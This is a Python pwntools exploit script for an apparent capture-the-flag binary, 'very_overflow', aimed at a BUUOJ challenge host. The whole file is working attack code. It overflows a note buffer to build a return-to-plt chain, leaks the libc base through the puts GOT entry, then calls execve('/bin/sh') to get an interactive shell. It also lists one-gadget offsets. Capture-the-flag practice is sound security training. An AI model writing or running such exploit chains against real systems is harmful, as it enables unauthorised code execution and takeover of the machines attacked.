import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		binary='very_overflow'
		elf=ELF(binary)
		pdbg=pwn_debug(binary)
		pdbg.local("/lib/i386-linux-gnu/libc-2.23.so")
		pdbg.debug("2.23")
		pdbg.remote('node3.buuoj.cn',28865)
		pdbg.context.log_level='debug'
		one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		if len(sys.argv)==1 :
			io=pdbg.run("local")
			#io=pdbg.run("debug")
			libc=pdbg.libc
		else :
			io=pdbg.run("remote")
			libc=ELF('../../i386libc/x86_libc.so.6')

		def add(c):
			io.sendlineafter('Your action: ','1')
			io.sendlineafter('Input your note: ',c)

		def dump(a):
			io.sendlineafter('Your action: ','4')

		def edit(a,c):
			io.sendlineafter('Your action: ','2')
			io.sendlineafter('Which note to edit: ',str(a))
			io.sendlineafter('Your new data: ',c)

		def show(a):
			io.sendlineafter('Your action: ','3')
			io.sendlineafter('Which note to show: ',str(a))
		


		for i in range(0xa5):
			add('a'*0x60)
		add('b'*0x4e+p32(elf.plt['puts'])+p32(0x08048490)+p32(elf.got['puts']))
		io.sendlineafter('Your action: ','5')
		libc_base=u32(io.recv(4)+'')-libc.sym['puts']
		libc.address=libc_base
		system_addr=libc.sym['execve']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		for i in range(0xa5):
			add('a'*0x60)
		add('b'*0x4e+p32(system_addr)+p32(0x08048490)+p32(bin_sh_addr)+p32(0)*2)
		io.sendlineafter('Your action: ','5')



		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue